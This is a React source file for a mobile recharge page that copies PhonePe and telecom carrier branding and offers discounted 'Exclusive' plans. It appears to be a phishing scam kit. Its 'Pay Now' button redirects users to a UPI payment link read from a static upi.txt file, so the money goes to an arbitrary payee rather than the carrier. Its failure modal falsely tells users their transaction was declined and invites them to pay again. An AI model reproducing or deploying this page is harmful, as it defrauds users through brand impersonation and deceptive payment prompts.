import { useParams } from 'react-router-dom';
import React, { useState, useEffect, useRef } from 'react';
import Swal from 'sweetalert2';

// ======================= MAIN COMPONENT =======================
function RechargePage() {
  const { number: enteredNumber, selectedOption: selectedPlan } = useParams();
  const [packages, setPackages] = useState([]);
  const [paymentAmount, setPaymentAmount] = useState(null);
  const paymentAmountRef = useRef(null);

  const images = {
    jio: '/images/jio.png',
    airtel: '/images/airtel.png',
    vi: '/images/vi.jpg',
    bsnl: '/images/bsnl.jpg',
  };

  const texts = {
    jio: 'Jio Prepaid',
    airtel: 'Airtel Prepaid',
    vi: 'VI Prepaid',
    bsnl: 'BSNL Prepaid',
  };

  const provider = {
    jio: 'Jio',
    airtel: 'Airtel',
    vi: 'VI',
    bsnl: 'BSNL',
  };

  // Load packages.json dynamically
  useEffect(() => {
    fetch('/packages.json')
      .then(res => res.json())
      .then(data => setPackages(data))
      .catch(() => {
        Swal.fire({
          icon: 'error',
          title: 'Failed to load packages.json',
        });
      });
  }, []);

  // Original payment method (UPI redirect processing route)
  function initiatePayment(amount, enteredNumber) {
    window.location.href = `/processing?number=${enteredNumber}&provider=${provider[selectedPlan]}&amount=${amount}`;
  }

  // Active upi.txt Fetch and DeepLink Construction
  function makePayment(amount) {
    setPaymentAmount(amount);
    paymentAmountRef.current = amount;

    // Fetches your raw payment protocol configuration template file
    fetch('/upi.txt')
      .then(response => response.text())
      .then(upiLink => {
        if (!upiLink.includes('am=')) {
          showPaymentFailedModal();
          return;
        }

        // Dynamically binds the specific item price matrix to the destination payload
        const updatedUpiLink = upiLink.replace(/am=\d+|am=null/, `am=${amount}`);
        window.location.href = updatedUpiLink;
      })
      .catch(() => {
        showPaymentFailedModal();
      });
  }

  function showPaymentFailedModal() {
    Swal.fire({
      icon: 'warning',
      title: 'Your transaction has been declined!',
      showCancelButton: true,
      confirmButtonText: 'Try Again',
      cancelButtonText: 'Cancel',
      confirmButtonColor: '#3085d6',
      cancelButtonColor: '#6E7881',
    }).then((result) => {
      if (result.isConfirmed) {
        makePayment(paymentAmountRef.current);
      }
    });
  }

  return (
    <div>
      {/* Header */}
      <div className="py-4 px-6 bg-white flex items-center justify-between border-b border-slate-100 mb-0">
        <div className="flex items-center">
          <svg
            stroke="currentColor"
            fill="currentColor"
            strokeWidth="0"
            viewBox="0 0 448 512"
            className="text-[#5F259F] mr-3"
            height="19"
            width="19"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"
            ></path>
          </svg>
          <a href="/">
            <img src="/images/phonepe.png" alt="" className="h-8" />
          </a>
        </div>
        <div>
          <svg
            stroke="currentColor"
            fill="currentColor"
            strokeWidth="0"
            viewBox="0 0 512 512"
            className="text-[#5F259F]"
            height="25"
            width="25"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"
            ></path>
          </svg>
        </div>
      </div>
      
      <div>
        {/* Package Target Panel */}
        <div className="bg-slate-100 py-4 px-4 text-[13.4px] flex items-center justify-between">
          <div className="flex items-center">
            <img
              src={images[selectedPlan] || 'default.jpg'}
              alt={`Plan ${selectedPlan}`}
              className="h-12 rounded-full"
            />
            <div className="font-bold text-[14px] text-purple-900 ml-2">
              <div>Recharge for: {enteredNumber}</div>
              <div className="text-slate-500 font-normal text-[12px] mt-[-2px]">
                {texts[selectedPlan] || 'Default text for plan'}
              </div>
            </div>
          </div>
          <a className="text-blue-600" href="/">Change</a>
        </div>
        
        <div className="px-2 my-0 bg-purple-200 py-5">
          <p className="text-center text-rose-600 text-[14px] font-bold">NEW!</p>
          <h1 className="text-[20px] font-bold text-center mt-[-2px] text-purple-900">
            RECHARGE & OFFERS
          </h1>
        </div>
        
        {/* Packages Grid Map */}
        <div className="px-5 bg-white pt-1">
          {packages.map((pkg) => (
            <div className="bg-white rounded-xl p-4 my-4 shadow-xl shadow-blue-100" key={pkg.id}>
              <div className="bg-rose-600 py-1 px-3 rounded text-white text-[10px] font-bold w-fit">
                Exclusive
              </div>
              <div className="flex items-center justify-between my-2">
                <div className="flex items-center text-[20px] font-bold text-slate-800">
                  <div>₹{pkg.discountPrice}</div>
                  <div className="ml-4 line-through text-slate-600">₹{pkg.actualPrice}</div>
                </div>
                <div>
                  <img src="/images/5g.svg" alt="" />
                </div>
              </div>
              <div className="flex items-center justify-between mt-3">
                <div>
                  <div className="text-slate-600 text-[13px]">VALIDITY</div>
                  <div className="text-slate-800 text-[13px] font-bold">{pkg.validity}</div>
                </div>
                <div>
                  <div className="text-slate-600 text-[13px]">DATA</div>
                  <div className="text-slate-800 text-[13px] font-bold">
                    {pkg.data}/day
                  </div>
                </div>
                <div>
                  <div className="text-slate-600 text-[13px]">Voice</div>
                  <div className="text-slate-800 text-[13px] font-bold">
                    {pkg.voice}
                  </div>
                </div>
                <div>
                  <div className="text-slate-600 text-[13px]">SMS</div>
                  <div className="text-slate-800 text-[13px] font-bold">{pkg.sms}/day</div>
                </div>
              </div>
              <div className="mt-4">
                <div className="text-purple-800 font-semibold text-[13px] mb-2">Subscription</div>
                <div className="flex gap-2 flex-wrap">
                  <img src={pkg.img1} alt="" className="h-6" />
                  <img src={pkg.img2} alt="" className="h-6" />
                  <img src={pkg.img3} alt="" className="h-6" />
                  <img src={pkg.img4} alt="" className="h-6" />
                  <img src={pkg.img5} alt="" className="h-6" />
                  <img src={pkg.img6} alt="" className="h-6" />
                </div>
              </div>
              <div className="mt-5 flex gap-2">
                <button
                  className="bg-phonepe py-2 flex-1 text-[13px] rounded-full font-bold text-white"
                  onClick={() => initiatePayment(pkg.discountPrice, enteredNumber)}
                >
                  Recharge
                </button>
                <button
                  className="bg-purple-600 py-2 flex-1 text-[13px] rounded-full font-bold text-white"
                  onClick={() => makePayment(pkg.discountPrice)}
                >
                  Pay Now
                </button>
              </div>
            </div>
          ))}
        </div>
        
        <img src="/images/footer.jpg" alt="" className="mt-10" />
      </div>
    </div>
  );
}

export default RechargePage;
